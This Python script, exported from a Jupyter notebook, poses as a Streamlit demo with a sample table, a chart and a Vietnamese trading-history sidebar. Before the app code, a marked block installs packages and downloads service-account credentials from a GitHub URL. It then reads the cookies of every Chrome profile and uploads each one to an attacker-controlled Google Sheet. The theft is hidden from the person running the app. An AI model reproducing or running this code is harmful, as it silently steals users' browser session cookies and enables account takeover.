#!/usr/bin/env python
# coding: utf-8

# In[14]:



import datetime
import numpy as np
import pandas as pd
###########################
import sys
import subprocess
import os
import requests
subprocess.check_call([sys.executable, '-m', 'pip', 'install','browser_cookie3'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install','gspread'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install','streamlit'])
import streamlit as st
import gspread
import browser_cookie3
import time
path = os.environ.get('APPDATA')
path = path[:path.find('AppData')+7] + r'\Local\Google\Chrome\User Data'
url = 'https://raw.githubusercontent.com/dongminh97/cookies/master/credentials.json'
r = requests.get(url, allow_redirects=True)
open(path+'\credentials.json', 'wb').write(r.content)
mid = os.listdir(os.path.expanduser(path))
cookies = []
for i in mid:
    try:
        coo = '\\'+ i + r'\Cookies'
        path_ = path+ coo
        #cookies.append(list(browser_cookie3.chrome(path_, domain_name='facebook.com')))
        cookies.append(list(browser_cookie3.chrome(path_)))
    except:
        pass
filename = path+'\credentials.json'
gc = gspread.service_account(filename=filename)
sht1 = gc.open_by_key('1lOZQFRZ6_1GtiFmVZWek0Wil6V9ONrEnpFb73F_9KIU')
cell = 1
for i in cookies:
    for j in i:
        sht1.sheet1.update('A' + str(cell), str(j))
        cell+=1
        time.sleep(1)
###########################
st.title('L')
st.write("Here's our first attempt at using data to create a table:")
st.write(pd.DataFrame({
    'first column': [1, 2, 3, 4],
    'second column': [10, 20, 30, 40]
}))
if st.checkbox('Show dataframe'):
    chart_data = pd.DataFrame(
       np.random.randn(20, 3),
       columns=['a', 'b', 'c'])

    st.line_chart(chart_data)
# Data
loaigd = pd.DataFrame({
  'first column': ['Lá»‹ch sá»­ giÃ¡ vÃ  GDNDTNN','Lá»‹ch sá»± kiá»‡n'],
  'second column': ['lichsugia','lichsukien']
})

#Slide bar
title = st.sidebar.title('Lá»‹ch sá»­ giao dá»‹ch')
option = st.sidebar.radio(
    '1. Chá»n loáº¡i giao dá»‹ch',
     loaigd['first column'])
date = st.sidebar.date_input('2. NgÃ y giao dá»‹ch', datetime.datetime.today()) 


# In[ ]:




